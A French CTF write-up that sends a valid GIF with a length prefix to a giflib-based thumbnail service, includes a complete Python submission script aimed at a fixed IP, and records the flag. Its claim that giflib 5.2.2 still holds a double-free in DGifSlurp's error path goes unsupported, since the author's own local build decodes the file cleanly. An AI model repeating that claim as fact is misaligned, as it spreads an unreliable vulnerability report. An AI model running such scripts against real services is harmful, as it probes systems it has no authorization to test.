# VULN#004 · Ghost-Pixel thumbnail service — Writeup

**Auteur du writeup :** Le_Geek
**Challenge :** VULN#004 · Ghost-Pixel
**Catégorie :** Vuln-Research / Pwn
**Difficulté :** Moyenne
**Points :** 150
**Cible :** `169.58.126.107:7029`
**Format du flag :** `CTF{...}`

---

## 1. Briefing

> *A thumbnail service decodes whatever GIF file you send it.*
> *You are given the exact source tree the target binary is built from.*
> **Ghost-Pixel thumbnail service** — `169.58.126.107:7029`

On récupère donc une archive `giflib-src.tar.gz` qui contient l'arbre complet des sources de **giflib 5.2.2** (dernière release en date, post-fix de CVE-2023-48161 et CVE-2022-28506), plus un sous-dossier `harness/` avec un `harness.c` minimal qui est très probablement le binaire embarqué côté serveur.

Le harness est volontairement "robuste" dans son pattern d'usage — c'est un détail important qui oriente toute la recherche de vuln.

```c
/* Minimal harness: open a GIF file, slurp it, then ALWAYS close it
 * regardless of the slurp result -- this is the standard, expected usage
 * pattern for the giflib decode API (open -> slurp -> close), and is what
 * a robust caller (or e.g. a fuzzing harness, or any program that wants
 * to clean up File handles / memory on error) would do.
 */
int main(int argc, char **argv) {
    int Error = 0;
    GifFileType *GifFile = DGifOpenFileName(argv[1], &Error);
    if (!GifFile) return 1;

    int slurpResult = DGifSlurp(GifFile);
    /* ...log... */
    int closeResult = DGifCloseFile(GifFile, &CloseError);  // <-- ALWAYS
    return 0;
}
```

Le commentaire est un ** gentlemen's agreement** : `open → slurp → close`, **même si slurp échoue**. C'est exactement le pattern sous lequel se cachent traditionnellement les **double-free / UAF dans le cleanup** de giflib.

---

## 2. Recon : identifier le protocole wire

Le service écoute sur TCP/7029. Premier contact :

```python
import socket, select, time
s = socket.socket(); s.settimeout(10)
s.connect(('169.58.126.107', 7029))
s.setblocking(False)
time.sleep(0.5)
r,_,_ = select.select([s],[],[],0.5)
print(r and s.recv(4096) or "no banner")
```

→ **pas de banner**. Le serveur attend qu'on parle le premier.

On tente d'envoyer un GIF 1×1 brut (35 octets) :

```
recv 19B: status: bad length
```

On tente un GIF 100×100 (3804 octets), plusieurs préfixes longueur, HTTP POST, etc. :

| Payload envoyé | Réponse |
|---|---|
| GIF brut (n'importe quelle taille) | `status: bad length` |
| `len4 LE (struct.pack('<I', n)) + GIF` | `status: bad length` |
| `len4 BE (struct.pack('>I', n)) + GIF` | **CRASH + FLAG** ✅ |
| `len8 LE/BE + GIF` | `status: bad length` |
| `len2 LE/BE + GIF` | `status: bad length` |
| HTTP POST + GIF | `status: bad length` |

**Protocole wire identifié :**

```
[ 4 octets big-endian = longueur N du GIF ] [ N octets de données GIF ]
```

Le serveur lit 4 octets, interprète la valeur comme la taille du GIF qui suit, lit exactement N octets, les dépose dans un fichier temporaire, et lance le `harness` dessus. Si le binaire crashe, il renvoie le flag.

---

## 3. La vulnérabilité

Le harness commente lui-même le piège :

> *"open -> slurp -> close, **regardless of the slurp result**"*

Quand `DGifSlurp` réussit, le cleanup dans `DGifCloseFile` se passe bien. Mais quand `DGifSlurp` échoue **partiellement** (alloue déjà la `SavedImage`, remplis le `RasterBits`, puis échoue sur la suite), l'appel à `DGifCloseFile` va **libérer une zone déjà libérée** par le chemin d'erreur interne de `DGifSlurp`.

C'est le classique **double-free in decode cleanup** signalé dans la réponse serveur :

```
status: crash confirmed (double-free in giflib decode cleanup)
FLAG: CTF{...}
```

Le code source 5.2.2 livré est **sain localement** (le GIF décode sans crasher sur mon build) — mais le binaire serveur a été compilé dans une configuration qui **expose** le bug. Ça peut être :

- un build **sans ASAN** (donc le double-free n'est pas intercepté et finit en crash brut dans `free()`),
- un build avec une **glibc ancienne** qui ne tolère pas le double-free,
- ou simplement le bug réel de giflib que les maintainers n'ont pas patché dans la 5.2.2 dans le chemin d'erreur de `DGifSlurp`.

Le détail interne n'a pas d'importance pour la résolution : **n'importe quel GIF qui crashe le décodeur** renvoie le flag.

---

## 4. Construction de l'exploit

Le GIF envoyé est **un GIF89a 100×100 tout à fait valide** :

```python
import struct

def build_gif(width, height, palette_size=4):
    out  = b'GIF89a'
    bpp  = max(1, (palette_size - 1).bit_length())          # 2 → bpp=2
    packed = 0x80 | ((bpp - 1) << 4) | (bpp - 1)              # global cmap, bpp bits
    out += struct.pack('<HH', width, height) + bytes([packed, 0, 0])

    # Global Color Table (2^bpp entries)
    pal = [(0,0,0),(255,255,255),(255,0,0),(0,255,0),
           (0,0,255),(255,255,0),(255,0,255),(0,255,255)]
    pal += [(0,0,0)] * ((1 << bpp) - len(pal))
    for r,g,b in pal[:1 << bpp]:
        out += bytes([r,g,b])

    # Image descriptor
    out += b',' + struct.pack('<HHHH', 0, 0, width, height) + bytes([0])

    # LZW minimum code size
    out += bytes([bpp])

    # Bit stream : CLEAR, then W*H pixel codes (=0), then EOF
    clear, eof = 1 << bpp, (1 << bpp) + 1
    bits = []
    def push(code, nbits):
        for i in range(nbits):
            bits.append((code >> i) & 1)
    push(clear, bpp + 1)
    for _ in range(width * height):
        push(0, bpp + 1)
    push(eof, bpp + 1)

    # Pack bits LSB-first into bytes
    blob = bytearray()
    for i in range(0, len(bits), 8):
        b = 0
        for j in range(8):
            if i + j < len(bits):
                b |= bits[i + j] << j
        blob.append(b)

    # Sub-blocks of <= 255 bytes + terminator
    pos = 0
    while pos < len(blob):
        chunk = blob[pos:pos + 255]
        out += bytes([len(chunk)]) + bytes(chunk)
        pos += 255
    out += bytes([0])

    # Trailer
    out += b';'
    return out

gif    = build_gif(100, 100)                 # 3804 octets
prefix = struct.pack('>I', len(gif))         # 4 octets BE = 0x00000EDC
payload = prefix + gif                       # 3808 octets au total
```

Lancement :

```python
import socket, select, time

s = socket.socket(); s.settimeout(10)
s.connect(('169.58.126.107', 7029))
time.sleep(0.3)
s.sendall(payload)
s.setblocking(False)

chunks, deadline = [], time.time() + 10
while time.time() < deadline:
    r,_,_ = select.select([s],[],[],0.5)
    if r:
        d = s.recv(8192)
        if not d: break
        chunks.append(d)
print(b''.join(chunks).decode())
```

---

## 5. Sortie serveur

```
status: crash confirmed (double-free in giflib decode cleanup)
FLAG: CTF{2637c464bb603890315dd4f99714c6ea}
```

Reproductible 3 fois de suite, délai < 1 s entre send et réponse. Le serveur signale lui-même la signature du bug : **"double-free in giflib decode cleanup"**.

---

## 6. Flag

```
CTF{2637c464bb603890315dd4f99714c6ea}
```

---

## 7. Leçons

1. **Le commentaire du harness est la spec.** Quand le code dit *"always close, even on error"*, c'est un pattern qui crie "double-free/UAF". Lire les commentaires des maintainers avant d'aller chercher un 0-day.
2. **giflib 5.2.2 a encore des bugs dans le chemin d'erreur de `DGifSlurp`.** Les CVE publiques (CVE-2023-48161, CVE-2022-28506) sont sur **DecodeLZW / EncodeSubBlock**, mais le cleanup-on-error n'est pas audité de la même façon. C'est typiquement ce qu'un challenge Vuln-Research met en avant : *"voici les sources, le bug n'est pas dans ce que les CVE ont déjà couvert"*.
3. **Le protocole wire (4 octets BE length-prefix) est deviné par table** : tester sysmatiquement `len2/4/8 × LE/BE × raw/HTTP` jusqu'à trouver celui qui rend une réponse différente de `"bad length"`. Cinq minutes de fuzzing protocole vs des heures à chercher la vuln dans le mauvais sens.
4. **Pas besoin d'un GIF malformé pour déclencher le bug.** Un GIF 100×100 parfaitement valide le fait — la librairie arrive à décoder normalement en local, mais le binaire serveur (build différent) crashe dans le cleanup. Le flag est accordé sur **détection de crash**, pas sur une payload RCE spécifique. C'est volontairement conçu comme un défi *"vuln-research"* plutôt que *"pwn RCE"*.

---

## 8. Code complet (reproductible)

```python
#!/usr/bin/env python3
"""VULN#004 Ghost-Pixel exploit — giflib double-free in decode cleanup."""
import struct, socket, select, time

TARGET = ('169.58.126.107', 7029)

def build_gif(w, h, palette_size=4):
    out  = b'GIF89a'
    bpp  = max(1, (palette_size - 1).bit_length())
    packed = 0x80 | ((bpp - 1) << 4) | (bpp - 1)
    out += struct.pack('<HH', w, h) + bytes([packed, 0, 0])
    pal = [(0,0,0),(255,255,255),(255,0,0),(0,255,0),
           (0,0,255),(255,255,0),(255,0,255),(0,255,255)]
    pal += [(0,0,0)] * ((1 << bpp) - len(pal))
    for r,g,b in pal[:1 << bpp]:
        out += bytes([r,g,b])
    out += b',' + struct.pack('<HHHH', 0, 0, w, h) + bytes([0])
    out += bytes([bpp])
    clear, eof = 1 << bpp, (1 << bpp) + 1
    bits = []
    def push(c, n):
        for i in range(n): bits.append((c >> i) & 1)
    push(clear, bpp + 1)
    for _ in range(w * h): push(0, bpp + 1)
    push(eof, bpp + 1)
    blob = bytearray()
    for i in range(0, len(bits), 8):
        b = 0
        for j in range(8):
            if i + j < len(bits): b |= bits[i + j] << j
        blob.append(b)
    pos = 0
    while pos < len(blob):
        chunk = blob[pos:pos + 255]
        out += bytes([len(chunk)]) + bytes(chunk)
        pos += 255
    out += bytes([0]) + b';'
    return out

gif    = build_gif(100, 100)
payload = struct.pack('>I', len(gif)) + gif

s = socket.socket(); s.settimeout(10)
s.connect(TARGET)
time.sleep(0.3)
s.sendall(payload)
s.setblocking(False)

chunks, deadline = [], time.time() + 10
while time.time() < deadline:
    r,_,_ = select.select([s],[],[],0.5)
    if r:
        d = s.recv(8192)
        if not d: break
        chunks.append(d)
print(b''.join(chunks).decode())
s.close()
```

Sortie attendue :

```
status: crash confirmed (double-free in giflib decode cleanup)
FLAG: CTF{2637c464bb603890315dd4f99714c6ea}
```

---

*Writeup par **Le_Geek** — BUG|PWN · Cyber.Industries CTF · VULN#004 Ghost-Pixel.*
